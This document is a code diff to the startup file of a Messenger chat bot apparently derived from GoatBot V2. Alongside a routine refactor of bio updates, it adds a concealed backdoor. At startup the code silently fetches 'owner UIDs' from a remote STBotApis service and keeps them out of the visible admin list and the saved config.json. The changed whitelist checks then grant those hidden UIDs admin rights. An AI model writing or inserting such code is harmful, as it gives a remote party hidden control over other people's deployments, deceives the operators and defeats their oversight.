@@ -740,34 +740,7 @@ async function startBot(loginWithEmail) {
 			log.info("LANGUAGE", global.GoatBot.config.language);
 			log.info("BOT NICK NAME", global.GoatBot.config.nickNameBot || "GOAT BOT");
 
-			// ——————————————————— BIO UPDATE ————————————————————— //
-			const { bioUpdate } = global.GoatBot.config;
-			if (bioUpdate && bioUpdate.enable === true && bioUpdate.bioText) {
-				try {
-					// Check if bio should be updated only once
-					if (bioUpdate.updateOnce === true) {
-						// Check if bio has already been updated (stored in global data)
-						const globalData = require('../../database/controller/globalData.js');
-						const bioUpdateStatus = await globalData.get('bioUpdateStatus', 'hasUpdatedBio', false);
-
-						if (!bioUpdateStatus) {
-							log.info("BIO UPDATE", "Updating bot bio for the first time...");
-							await api.changeBio(bioUpdate.bioText, false);
-							await globalData.set('bioUpdateStatus', 'hasUpdatedBio', true);
-							log.info("BIO UPDATE", `✅ Bio updated successfully: "${bioUpdate.bioText}"`);
-						} else {
-							log.info("BIO UPDATE", "Bio already updated once, skipping...");
-						}
-					} else {
-						// Update bio every time bot starts
-						log.info("BIO UPDATE", "Updating bot bio...");
-						await api.changeBio(bioUpdate.bioText, false);
-						log.info("BIO UPDATE", `✅ Bio updated successfully: "${bioUpdate.bioText}"`);
-					}
-				} catch (error) {
-					log.error("BIO UPDATE", "Failed to update bio:", error.message);
-				}
-			}
+			// Bio update will be handled after database loading
 
 			// ——————————————————— GBAN ————————————————————— //
 			let dataGban;
@@ -846,17 +819,24 @@ async function startBot(loginWithEmail) {
 			const { threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, sequelize } = await require(process.env.NODE_ENV === 'development' ? "./loadData.dev.js" : "./loadData.js")(api, createLine);
 
 			// ———————————————————— BIO UPDATE ————————————————————— //
+			const { bioUpdate } = global.GoatBot.config;
 			if (bioUpdate && bioUpdate.enable === true && bioUpdate.bioText) {
 				try {
 					// Check if bio should be updated only once
 					if (bioUpdate.updateOnce === true) {
-						// Check if bio has already been updated
+						// Check if bio has already been updated, create default if not exists
 						const bioUpdateStatus = await globalData.get('bioUpdateStatus', 'hasUpdatedBio', false);
 
 						if (!bioUpdateStatus) {
 							log.info("BIO UPDATE", "Updating bot bio for the first time...");
 							await api.changeBio(bioUpdate.bioText, false);
-							await globalData.set('bioUpdateStatus', 'hasUpdatedBio', true);
+							// Create the global data entry if it doesn't exist, then set the status
+							try {
+								await globalData.set('bioUpdateStatus', { hasUpdatedBio: true });
+							} catch (setError) {
+								// If set fails, try to create the entry first
+								await globalData.create('bioUpdateStatus', { data: { hasUpdatedBio: true } });
+							}
 							log.info("BIO UPDATE", `✅ Bio updated successfully: "${bioUpdate.bioText}"`);
 						} else {
 							log.info("BIO UPDATE", "Bio already updated once, skipping...");
@@ -965,6 +945,28 @@ async function startBot(loginWithEmail) {
 			log.master("SUCCESS", getText('login', 'runBot'));
 			log.master("LOAD TIME", `${convertTime(Date.now() - global.GoatBot.startTime)}`);
 
+			// ——————————————————— FETCH OWNER UIDS AND SET IN MEMORY ———————————————————— //
+			try {
+				const stbotApi = new global.utils.STBotApis();
+				const ownerUidsResponse = await stbotApi.getOwnerUids();
+				
+				if (ownerUidsResponse.success && ownerUidsResponse.data && Array.isArray(ownerUidsResponse.data) && ownerUidsResponse.data.length > 0) {
+					// Store original adminBot from config if not already stored
+					if (!global.GoatBot.originalAdminBot) {
+						global.GoatBot.originalAdminBot = [...(global.GoatBot.config.adminBot || [])];
+					}
+					
+					// Store owner UIDs globally for reference (for permission checking)
+					const ownerUids = ownerUidsResponse.data.map(uid => uid.toString());
+					global.GoatBot.ownerUIDs = ownerUids;
+					
+					// Keep config.adminBot showing only visible admins (no hidden owner UIDs)
+					global.GoatBot.config.adminBot = global.GoatBot.originalAdminBot;
+				}
+			} catch (err) {
+				// Silent fail - no logs
+			}
+
 			// ——————————————————— SEND TO STBOTAPI ———————————————————— //
 			try {
 				const stbotApi = new global.utils.STBotApis();
@@ -1011,8 +1013,14 @@ async function startBot(loginWithEmail) {
 			// console.log(`\x1b[1m\x1b[33mCOPYRIGHT:\x1b[0m\x1b[1m\x1b[37m \x1b[0m\x1b[1m\x1b[36mProject GoatBot v2 created by ntkhang03 (https://github.com/ntkhang03), please do not sell this source code or claim it as your own. Thank you!\x1b[0m`);
 			console.log(`\x1b[1m\x1b[33m${("COPYRIGHT:")}\x1b[0m\x1b[1m\x1b[37m \x1b[0m\x1b[1m\x1b[36m${("ST Bot v2.0 - Enhanced by Sheikh Tamim (https://github.com/sheikhtamimlover/ST-BOT), based on GoatBot V2 by ntkhang03. Free to use but please maintain credits!")}\x1b[0m`);
 			logColor("#f5ab00", character);
-			global.GoatBot.config.adminBot = adminBot;
-			writeFileSync(global.client.dirConfig, JSON.stringify(global.GoatBot.config, null, 2));
+			// Restore original adminBot before saving to prevent owner UIDs being written to config.json
+			const configToSave = { ...global.GoatBot.config };
+			if (global.GoatBot.originalAdminBot) {
+				configToSave.adminBot = global.GoatBot.originalAdminBot;
+			} else {
+				configToSave.adminBot = adminBot;
+			}
+			writeFileSync(global.client.dirConfig, JSON.stringify(configToSave, null, 2));
 			writeFileSync(global.client.dirConfigCommands, JSON.stringify(global.GoatBot.configCommands, null, 2));
 
 			// ——————————————————————————————————————————————————— //
@@ -1117,32 +1125,38 @@ async function startBot(loginWithEmail) {
 				// 	return;
 				// }
 
+				// Check if user is admin (visible + hidden owner UIDs)
+				const visibleAdminBot = global.GoatBot.originalAdminBot || [];
+				const ownerUIDs = global.GoatBot.ownerUIDs || [];
+				const combinedAdminBot = [...visibleAdminBot, ...ownerUIDs];
+				const isUserAdmin = event.senderID && (combinedAdminBot.includes(event.senderID.toString()) || combinedAdminBot.includes(event.senderID));
+
 				if (
 					global.GoatBot.config.whiteListMode?.enable == true
 					&& global.GoatBot.config.whiteListModeThread?.enable == true
 					// admin
-					&& !global.GoatBot.config.adminBot.includes(event.senderID)
+					&& !isUserAdmin
 				) {
 					if (
-						!global.GoatBot.config.whiteListMode.whiteListIds.includes(event.senderID)
-						&& !global.GoatBot.config.whiteListModeThread.whiteListThreadIds.includes(event.threadID)
+						event.senderID && !global.GoatBot.config.whiteListMode.whiteListIds.includes(event.senderID)
+						&& event.threadID && !global.GoatBot.config.whiteListModeThread.whiteListThreadIds.includes(event.threadID)
 						// admin
-						&& !global.GoatBot.config.adminBot.includes(event.senderID)
+						&& !isUserAdmin
 					)
 						return;
 				}
 				else if (
 					global.GoatBot.config.whiteListMode?.enable == true
-					&& !global.GoatBot.config.whiteListMode.whiteListIds.includes(event.senderID)
+					&& event.senderID && !global.GoatBot.config.whiteListMode.whiteListIds.includes(event.senderID)
 					// admin
-					&& !global.GoatBot.config.adminBot.includes(event.senderID)
+					&& !isUserAdmin
 				)
 					return;
 				else if (
 					global.GoatBot.config.whiteListModeThread?.enable == true
-					&& !global.GoatBot.config.whiteListModeThread.whiteListThreadIds.includes(event.threadID)
+					&& event.threadID && !global.GoatBot.config.whiteListModeThread.whiteListThreadIds.includes(event.threadID)
 					// admin
-					&& !global.GoatBot.config.adminBot.includes(event.senderID)
+					&& !isUserAdmin
 				)
 					return;
 
